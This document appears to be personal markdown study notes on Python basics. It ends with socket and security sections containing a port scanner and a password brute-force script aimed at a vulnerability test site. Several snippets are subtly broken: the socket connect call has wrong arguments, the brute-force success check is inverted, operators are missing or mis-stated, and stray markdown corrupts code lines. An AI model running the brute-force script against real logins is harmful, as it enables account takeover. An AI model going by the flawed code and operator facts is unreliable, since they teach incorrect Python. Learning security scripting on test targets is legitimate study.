---
description: >-
  Notion Link:
  https://wise-monitor-956.notion.site/Python-10c1d1e7e13c800cb943d06973f15a4c
cover: ../.gitbook/assets/image (9).png
coverY: 0
---

# Python

### String

**Creation:**

* Example: `my_string = 'Hello, World!'` or `my_string = "Hello, World!"`

**Accessing Characters:**

* You can access individual characters within a string using indexing, starting from 0.
* Example: `print(my_string[0])` would output 'H'.

**String Concatenation:**

* You can concatenate (join) two or more strings using the `+` operator.
* Example: `greeting = 'Hello' + ' ' + 'World!'` would result in 'Hello World!'.

**String Length:**

* The `len()` function can be used to determine the length (number of characters) of a string.
* Example: `print(len(my_string))` would output the length of the string.

**String Slicing:**

* You can extract a substring from a string using slicing, specifying the start and end indices.
* Example: `substring = my_string[7:12]` would extract the substring 'World'.

```python
print(x[:9]) # will print from 0 to 9
print(x[9:]) # print from 9 to the last char
print(x[0:5]) # print from 0 to 5
```

**String Methods:**

* Python provides various built-in methods to manipulate and transform strings. Examples include `upper()`, `lower()`, `strip()`, `split()`, `replace()`, and more.
* Example: `print(my_string.upper())` would output 'HELLO, WORLD!'.

```python
# split : splits a string into a list of strings after breaking the given string by the specified separator.

x="hello world"
print(x.split(" "))
# output
['hello', 'world']
```

**String Formatting:**

* String formatting allows you to embed values within a string. This can be done using the `%` operator or the `format()` method.
* You can also use f strings as shown in the example below

```python
name = 'Alice'
age = 30
print("My name is %s and I'm %d years old." % (name, age))
print(f"My name is {name} and I'm {age} years old.") # i like this way
# Both will output: My name is Alice and I'm 30 years old.
```

```python
print("""This string runs
multiple lines!""")

*triple quote for multi-line*
```

To check if this char is found

```python
user="hello world"
print("a" in user)  # return  true or false - Case sensitive
```

***

### **Arithmetic Operations**

**Math Operators:**

* Addition (`+`): Adds two numbers.
* Subtraction (\`\`): Subtracts one number from another.
* Multiplication (\`\`): Multiplies two numbers.
* Division (`/`): Divides one number by another.
* Integer Division (`//`): Performs division and returns the quotient as an integer (rounds down) .
* Modulo (`%`): Returns the remainder of division.
* Exponentiation (`*`): Raises a number to a power.

`u can use (int(5/2)) to return the int value`

**Math Functions in the `math` Module:**

* `math.sqrt(x)`: Calculates the square root of `x`.
* `math.pow(x, y)`: Raises `x` to the power of `y`.
* `math.exp(x)`: Calculates the exponential value of `x` (e^x).
* `math.log(x)`: Calculates the natural logarithm of `x` (base e).
* `math.log10(x)`: Calculates the logarithm of `x` to base 10.
* `math.sin(x)`, `math.cos(x)`, `math.tan(x)`: Calculate the sine, cosine, and tangent of `x`, respectively (where `x` is in radians).
* `math.degrees(x)`: Converts `x` from radians to degrees.
* `math.radians(x)`: Converts `x` from degrees to radians.

`but you must import math module first`

***

### **Variables and Basic Methods**

**Functions**

Some function for string `upper()` , `lower()` , `title()`

```python
var = "hello world"
print(var.upper()) # print all cahrs is upper "HELLO WORLD"
print(var.lower()) # print all cahrs is lower "hello world"
print(var.title()) # print the first char of each word is capital "Hello World"
```

→ In python we can’t concatenate `int`with `string` we can transfer it to string to use concatenation by this way `str(var)`

→ python don’t have `Postfix` and `Prefix`

***

### User Input

We use `input()` to take value from user

```python
var = input("Enter your name")
print (f"your name is {var}") # your name is Ahmed

# the value is stored in var is always string
var = int(input("Enter your age: "))
print (type(var)) # is print <calss 'int'> # the type of var is int
```

***

### Functions

To write Function `def NameOfFunction():`

```python
# void function (like cpp XD :)
def whoami(name,age):
	print(f"my name is {name} and my age is {age}")
# creat two varible to use him in the function
name = input()
age = input()
whoami(name,age) # the output is "my name is ahmed and my age is 99"
```

```python
def add(num1,num2):
    return num1 + num2
    
x=20;y=20  # we can write to variable in the same line but we must write semi column (;) 
print(add(x,y))
```

→ `num1`, `num2` in function called `parameter`

***

### Condition

if condition have 3 type `if`, `elif`, `else`

```python
# and , or used in condition
def fun(x):
    if x>=93 and x<=100:
        return "A grade"
    elif x<93 and x>=89:
        return "A- grade"
    else:
        return "B grade"
print(fun(92))
print(fun(80))
```

***

### Loop

**Use For loop**

```python
x="hello everyone how are you"
for i in x:
    print(i,end=" ") # print each char with space not new line
# output -> h e l l o   e v e r y o n e   h o w   a r e   y o u
```

`range` → we use it with int number and have `(start,end,step)`

```python
for i in range(0,10,2):
    print(i,end="")       # output is 02468 start=0 , end=10 ,step=2
    
for i in range(0,10):    # we can remove step (default step is 1) and we can remove start (default is 0)
    print(i,end="")        # 0123456789
```

**Use While loop**

→ we use while when we can’t know the number of steps we need it so use it with condition like check the correct password

```python
x=10
while x>5:
    print(x,end=" ")  # output is 10 9 8 7 6 
    x-=1
```

***

### List

Have `brackets []` - everything inside is called an item - is called array in another programming language like cpp,php,etc

```python
arr=["ahmed",99,"hitler",'c']
print(arr[1]) # output is 99 - return the second item in the list
print(arr[1:3]) # return the first number (99) until the last number given (hitler) | 1 - 2 -> range
print(arr[:2])  # return from item 0 to item 1 (ahmed , 99)  
print(arr[-1])  # return the last item 
```

Some Function use with List

```python
arr.append("user") # insert value in the last of list
arr.insert(2,20)   # take the position and value
arr.pop(2)        # remove item 2 from list the default value is -1
```

→ Combine list : concatenation with two list or more and store it in another list

***

### Tuples

`Immutable`(can’t be changed) - `()`

```python
arr=("user",20,"test")
print(arr)
```

we can use it with color like `red =(255,0,0)`

***

### Dictionary

Key/Value pairs { } -`{key:value}`

```python
x={"name": "ahmed","age":00}
print(x["name"])  # to print value you must use the key of this value
```

the value may be `List` but the key is unique

```python
dict={"users":["user1","user2","user3"]}
```

we can add new key to dictionary by this way

```python
dict={"users":["user1","user2","user3"]}
dict["cname"]="alias"  # NameOfDictionary[Key]=value
print(dict)  # output => {'users': ['user1', 'user2', 'user3'], 'cname': 'alias'}
```

Dictionary functions

```python
dict={"users":["user1","user2","user3"]}
dict.update({"cname":"alias"})   # use to insert key,value in the dictionary
print(dict.get("cname"))          # print the value for this key

print(len(dict))     # print the length for this dictionry
del dict["cname"]  # delete the item from dictionary
del dict     # delete this dictionary
```

To print dictionary with loop

```python
for key in dict:
    print(key,dict[key])
```

***

### Socket

To use socket u must import this module `import socket`

```python
import socket
host = '127.0.0.1'
port = 7777

# create TCP connection
tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # AF_INET -> IPv4 , SOCK_STREAM -> Port (for TCP)

# Create a UDP socket
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # AF_INET -> IPv4 , SOCK_DGTAM -> Port (for TCP)

tcp_socket.connect((host,port))
```

Once you have a socket object, you can use various methods to establish connections, send data, and receive data. Here are some commonly used methods:

* `socket.connect(address)`: Establishes a connection to a remote address.
* `socket.bind(address)`: Binds the socket to a specific address and port.
* `socket.listen(backlog)`: Listens for incoming connections on a TCP socket.
* `socket.accept()`: Accepts an incoming connection and returns a new socket object for communication.
* `socket.send(data)`: Sends data over the socket.
* `socket.recv(buffer_size)`: Receives data from the socket.
* `socket.settimeout(0.5)` : Set time for connection

**Port Scanning For ip address**

```python
import socket

def port_scanning(ipaddress, port):
    try:
        soc=socket.socket()
        soc.settimeout(0.5)
        soc.connect(ipaddress,port)
        print (f"the port {port} is open")
    except:
        print (f"the port {port} is closed")

ip=input("[+]Enter the IP address: ")
for port in range(74,85):
    port_scanning(ip, port)
```

**check if is port or domain**

```python
import socket
from IPy import IP

def check_ip(ip):
    try:              # if user input is ip he will return him
        IP(ip)
        return ip
    except ValueError:    # if user input is domain he will convert him
        return socket.gethostbyname(ip)
ip=input("[+]Enter the IP address: ")
convert_ip=check_ip(ip)   # check if is domain or ip
```

***

### Security

we have many modules in python like `os` where it use to execute command on the system

```python
import os
print(os.system("dir"))  # show all file in windows
```

`requests` send request to web page

**GET** Request

```python
import requests as req
url="<http://testhtml5.vulnweb.com/#/popular>"
res=req.**get**(url)      # to get data from the server
print(res.text)       # show page source for this page in the request
print(res.status_code)  # show status code 200,301,302,404
```

**POST** Request

```python
import requests as req
url="<http://test.com/login>"
payload="usernam=test&password=test"  # data it will be sent (input name, input password)
res=req.**post**(url,data=payload)  # send data to server
print(res.text)
```

**Password** brute force

```python
import requests as req
url="<http://testphp.vulnweb.com/login.php>"
def attack(lol):
    payload = f"uname=admin&password={lol}"
    res=req.post(url,data=payload)
    if "Invalid username or password" not in res.text:
        return 0;
    else:
        return 1;
password=open("password.txt", "r")
while True:
    line = password.readline().strip()
    if not line:
        print("Password not found")
        break
    if attack(line):
        print(f"Found password: {line}")
        break
```

***

### Notes

<figure><img src="../.gitbook/assets/Screenshot 2024-09-24 194254.png" alt=""><figcaption></figcaption></figure>

***

#### **Variable Best Practices**

**Best Practice for Variable Naming: `snake_case`**

* All letters are in **lowercase**.
* Words are separated by **underscores** (`_`).

**Example of Snake Case:**

```python
total_amount = 100
user_name = "JohnDoe"
is_valid = True
```

**Constants in All Uppercase**:

* For variables that represent constants (values that do not change), use **ALL\_UPPERCASE** with underscores between words.
* Example:

```python
MAX_SIZE = 100
DEFAULT_TIMEOUT = 30
```

**Private Variables with Leading Underscore**:

* If you intend for a variable to be used only within a module or class, prefix it with a single underscore (`_`), indicating that it is meant to be "private."
* Example:

```python
_cache = {}
_internal_variable = 42
```

**Summary of Best Practices:**

* \*\*Use `snake_case**` for variable names.
* **Use meaningful and descriptive** names.
* **Avoid reserved keywords**.
* Use **ALL\_UPPERCASE** for constants.
* Use a **leading underscore (`_`)** for internal/private variables.
* **Be consistent** with naming conventions across your code.

***
